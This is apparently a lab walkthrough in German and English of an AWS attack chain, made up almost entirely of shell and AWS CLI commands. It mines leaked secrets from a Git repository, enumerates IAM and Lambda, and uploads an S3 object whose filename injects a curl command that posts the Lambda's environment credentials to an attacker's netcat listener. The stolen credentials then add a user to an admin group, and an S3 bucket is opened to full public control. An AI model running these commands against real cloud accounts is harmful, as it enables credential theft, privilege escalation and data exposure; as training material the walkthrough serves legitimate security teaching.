# Open Source Intelligence (OSINT)
```
git clone https://github.com/ITGAIN/AWS-OSINT-boto3
gitleaks detect -r report.json
cat report.json # siehe commit sha
git checkout 9b0a8853d6412d1fa3907fda4143ca8ffd0ba3c1
cat ec2.py
```
# Informationsbeschaffung (Enumeration)
```
aws sts get-caller-identity --profile bob  | jq

aws iam list-attached-user-policies --user-name developer_bob --profile bob  | jq

aws lambda list-functions --profile bob  | jq
aws lambda get-policy --function-name scan_tar_from_bucket --profile bob  | jq
aws lambda get-function --function-name scan_tar_from_bucket --profile bob  | jq
aws iam list-attached-role-policies --role-name lambda_role_for_development --profile bob  | jq
aws iam list-policies --profile bob | grep -i dev_iam_admin -A 9
aws iam get-policy-version --policy-arn arn:aws:iam::1234567890:policy/dev_iam_admin --version-id v1 --profile bob  | jq

aws iam list-groups --profile bob  | jq
aws iam list-attached-group-policies --group-name entwickler-admin --profile bob  | jq
```

# Code Analyse and Privilege Escalation
## download function and analyse code
```
open lambda_function.py
```

## open netcat on external server to catch CURL
```
sudo nc -lvnp 80
```

## upload the malicious tar
```
touch 'hello;curl -X POST -d "`env`" [YOUR-IP];.tar'
aws s3 cp ./hello\;curl\ -X\ POST\ -d\ \"\`env\`\"\ [YOUR-IP]\;.tar s3://datenablage-allgemein --profile bob (2x)
aws configure --profile privesc
```

# Privilege Escalation
```
aws iam add-user-to-group --group-name entwickler-admin --user-name developer_bob --profile privesc
aws iam list-groups-for-user --user-name developer_bob --profile bob  | jq
```

# Dataleak Example
```
aws s3api get-public-access-block --bucket datenablage-allgemein --profile bob  | jq
aws s3api put-public-access-block --bucket datenablage-allgemein --public-access-block-configuration "BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets=false" --profile bob
aws s3api get-public-access-block --bucket datenablage-allgemein --profile bob  | jq

aws s3api get-bucket-ownership-controls --bucket datenablage-allgemein --profile bob  | jq
aws s3api put-bucket-ownership-controls --bucket datenablage-allgemein --ownership-controls Rules=[{ObjectOwnership=BucketOwnerPreferred}] --profile bob
aws s3api get-bucket-ownership-controls --bucket datenablage-allgemein --profile bob  | jq

aws s3api get-bucket-acl --bucket datenablage-allgemein --profile bob  | jq
aws s3api put-bucket-acl --bucket datenablage-allgemein --grant-full-control uri=http://acs.amazonaws.com/groups/global/AllUsers --profile bob
aws s3api get-bucket-acl --bucket datenablage-allgemein --profile bob  | jq
```